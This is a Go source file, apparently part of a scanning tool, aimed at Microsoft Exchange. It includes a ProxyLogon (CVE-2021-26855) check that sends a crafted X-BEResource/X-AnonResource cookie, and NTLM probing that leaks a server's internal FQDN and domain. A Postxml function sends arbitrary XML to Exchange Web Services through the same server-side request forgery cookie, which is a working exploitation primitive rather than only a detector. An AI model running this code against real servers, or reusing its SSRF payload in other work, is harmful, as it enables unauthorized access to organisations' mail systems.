package ms

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

// check CVE-2021-26855
//
// https://github.com/righel/ms-exchange-version-nse/blob/main/ms-exchange-version.nse
// 指纹：path /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
// /ecp/%s/exporttool/microsoft.exchange.ediscovery.exporttool.application
// <assemblyIdentity.*version="(%d+.%d+.%d+.%d+)"
//
// https://raw.githubusercontent.com/righel/ms-exchange-version-nse/main/ms-exchange-versions-dict.json
// https://raw.githubusercontent.com/righel/ms-exchange-version-nse/main/ms-exchange-unique-versions-dict.json
// https://raw.githubusercontent.com/righel/ms-exchange-version-nse/main/ms-exchange-versions-cves-dict.json
// port 443
// https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855
// add Microsoft Exchange Server Remote Code Execution Vulnerability CVE-2021-26855 finder
// https://www.msb365.blog/?p=4099
func CheckCVE_2021_26855(target string) string {
	//fmt.Println("check... "+target)
	targetUrl := "https://" + target + "/owa/auth/temp.js"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: time.Duration(3 * time.Second)}
	req, _ := http.NewRequest("GET", targetUrl, nil)
	req.Header.Add("Cookie", "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;")
	resp, err2 := client.Do(req)
	if nil != err2 {
		return ""
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	if strings.Contains(string(body), "NegotiateSecurityContext") {
		s1 := fmt.Sprintf("%s IsVUL CVE-2021-26855\n", target)
		return s1
	}
	return ""
}

// add EXCHANGE Finder
func GetExFQND(target string) string {
	//fmt.Println("check... "+target)
	ewsUrl := "https://" + target + "/ews/exchange.asmx"
	fqndstr, _ := Ntlminfo(ewsUrl)
	if strings.Contains(fqndstr, ".") {
		return fmt.Sprintf("Exchange %s %s\n", target, fqndstr)
	}
	return ""
}

func append16(v []byte, val uint16) []byte {
	return append(v, byte(val), byte(val>>8))
}

func append32(v []byte, val uint16) []byte {
	return append(v, byte(val), byte(val>>8), byte(val>>16), byte(val>>24))
}

const (
	negotiateUnicode    = 0x0001 // Text strings are in unicode
	negotiateOEM        = 0x0002 // Text strings are in OEM
	requestTarget       = 0x0004 // Server return its auth realm
	negotiateSign       = 0x0010 // Request signature capability
	negotiateSeal       = 0x0020 // Request confidentiality
	negotiateLMKey      = 0x0080 // Generate session key
	negotiateNTLM       = 0x0200 // NTLM authentication
	negotiateLocalCall  = 0x4000 // client/server on same machine
	negotiateAlwaysSign = 0x8000 // Sign for all security levels
)

//ntlm type1
func Negotiate() []byte {
	var ret []byte
	flags := negotiateAlwaysSign | negotiateNTLM | requestTarget | negotiateOEM

	ret = append(ret, "NTLMSSP\x00"...) // protocol
	ret = append32(ret, 1)              // type
	ret = append32(ret, uint16(flags))  // flags
	ret = append16(ret, 0)              // NT domain name length
	ret = append16(ret, 0)              // NT domain name max length
	ret = append32(ret, 0)              // NT domain name offset
	ret = append16(ret, 0)              // local workstation name length
	ret = append16(ret, 0)              // local workstation name max length
	ret = append32(ret, 0)              // local workstation name offset
	ret = append16(ret, 0)              // unknown name length
	ret = append16(ret, 0)              // ...
	ret = append16(ret, 0x30)           // unknown offset
	ret = append16(ret, 0)              // unknown name length
	ret = append16(ret, 0)              // ...
	ret = append16(ret, 0x30)           // unknown offset

	return ret
}

//ntlm type2 fqdn
func Ntlminfo(targetUrl string) (fqdn string, domain string) {
	//var fqdn string
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: time.Duration(3 * time.Second)}

	req, _ := http.NewRequest("GET", targetUrl, nil)
	req.Header.Add("Authorization", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(Negotiate())))
	req.Header.Add("Accept", "text/xml")
	resp, err := client.Do(req)
	if nil != err {
		return
	}
	reg1 := regexp.MustCompile(`[^NTLM].+;Negotiate\z`)
	reg2 := regexp.MustCompile(`[^\s].+[^;Negotiate]`)
	reg3 := regexp.MustCompile(`(\x03\x00.)(.+?)(\x05\x00)`)
	reg4 := regexp.MustCompile(`\x03\x00.|\x05|\x00`)
	reg5 := regexp.MustCompile(`(\x04\x00.)(.+?)(\x03\x00)`)
	reg6 := regexp.MustCompile(`\x04\x00.|\x03|\x00`)

	for _, values := range resp.Header {
		type2 := reg2.FindString(reg1.FindString(strings.Join(values, ";")))
		if type2 != "" {
			decodeBytes, _ := base64.StdEncoding.DecodeString(reg2.FindString(type2))
			fqdn = reg4.ReplaceAllString(reg3.FindString(string(decodeBytes)), "")
			domain = reg6.ReplaceAllString(reg5.FindString(string(decodeBytes)), "")
		}
	}
	return
}

func Postxml(targetUrl string, fqdn string, xmlcontent string) string {
	//urlProxy, _ := url.Parse("http://127.0.0.1:8080")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//    Proxy: http.ProxyURL(urlProxy),
	}
	client := &http.Client{Transport: tr}

	req, _ := http.NewRequest("POST", targetUrl, strings.NewReader(xmlcontent))
	req.Header.Add("Cookie", fmt.Sprintf("X-BEResource=%s/EWS/Exchange.asmx?a=~1942062522;", fqdn))
	req.Header.Add("Content-Type", "text/xml")
	//fmt.Println(req)
	resp2, _ := client.Do(req)

	//defer resp2.Body.Close()
	body2, _ := ioutil.ReadAll(resp2.Body)

	return string(body2)
}
func makefile(fileName string, conntent string) {

	f, err := os.Create(fileName)
	defer f.Close()
	if err != nil {
		fmt.Println(err.Error())
	} else {
		_, _ = f.Write([]byte(conntent))
	}
}
